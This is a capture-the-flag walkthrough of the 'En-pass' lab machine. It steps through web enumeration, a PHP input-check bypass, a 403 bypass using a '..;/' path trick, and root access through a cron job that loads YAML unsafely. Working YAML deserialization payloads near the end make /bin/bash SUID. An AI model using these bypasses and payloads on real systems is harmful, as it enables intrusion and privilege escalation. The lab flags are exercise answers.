# En-pass 

> VOiD | Tuesday 22 March 2022 03:54:22 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.194.45


## PORT 8001 [http]
```bash
http://10.10.194.45:8001/web
http://10.10.194.45:8001/reg.php --> have a php code
http://10.10.194.45:8001/web/resources
http://10.10.194.45:8001/zip
http://10.10.194.45:8001/web/resources/infoseek/
http://10.10.194.45:8001/web/resources/infoseek/configure/
http://10.10.194.45:8001/web/resources/infoseek/configure/key -- > gives ssh key
http://10.10.194.45:8001/403.php --> gives custom 403 error

```

```php
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){     
          $val = explode(",",$title);
          $sum = 0;
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 )){
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          }
          if ( ($sum) == 9 ){
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
            }
                    else{
                      echo "  Try Try!!";
                  }
          }
          else{
            echo "  Try Again!! ";
          }     
 
  }
?>
```

```bash
curl -XPOST http://10.10.194.45:8001/reg.php -d 'title="",",",","","""","",""""""","""'
or using 
$$,!,@,#,$,^,&,*,(((
Nice. Password : cimihan_are_you_here? 

to get username
Try bypassing  
http://10.10.194.45:8001/403.php

python3 403bypasser.py -u http://10.10.194.45:8001 -d /403.php

curl http://10.10.194.45:8001/403.php/..;/

<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>
```


## USER [imsau]
```bash
imsau@enpass:~$ cat user.txt 
1c5ccb6ce6f3561e302e0e516c633da9

2022/03/23 06:50:01 CMD: UID=0    PID=9743   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2022/03/23 06:50:01 CMD: UID=0    PID=9742   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2022/03/23 06:50:01 CMD: UID=0    PID=9741   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2022/03/23 06:50:01 CMD: UID=0    PID=9740   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml

2022/03/23 06:50:01 CMD: UID=0    PID=9744   | sudo chown root:root /tmp/file.yml 
2022/03/23 06:50:01 CMD: UID=0    PID=9745   | sudo /usr/bin/python /opt/scripts/file.py


imsau@enpass:/opt/scripts$ cat file.py 
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())


```
```py
exploit

!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "chmod +s /bin/bash"

or

!!python/object/apply:os.system ["chmod 4777 /bin/bash"]

bash-4.3# cat /root/root.txt
5d45f08ee939521d59247233d3f8faf

```